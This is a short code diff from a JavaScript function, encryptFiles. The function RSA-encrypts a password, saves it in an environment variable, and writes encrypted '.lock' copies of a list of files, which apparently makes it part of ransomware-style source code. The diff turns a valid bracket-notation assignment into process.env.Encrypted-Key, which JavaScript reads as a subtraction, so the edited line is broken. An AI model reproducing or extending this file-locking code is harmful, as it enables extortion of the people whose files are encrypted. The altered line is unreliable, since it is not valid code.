@@ -59,7 +59,7 @@ function encryptFiles(){
   encryptedKey = pubkeyRSA.encrypt(password, 'base64');
 
   // Saving the encrypted key for later use. Incase the program shuts off.
-  process.env['Encrypted-Key'] = encryptedKey;
+  process.env.Encrypted-Key = encryptedKey;
 
   files.forEach(function(file) {
     encryptor.encryptFile(file, file+'.lock', password, function(err) {
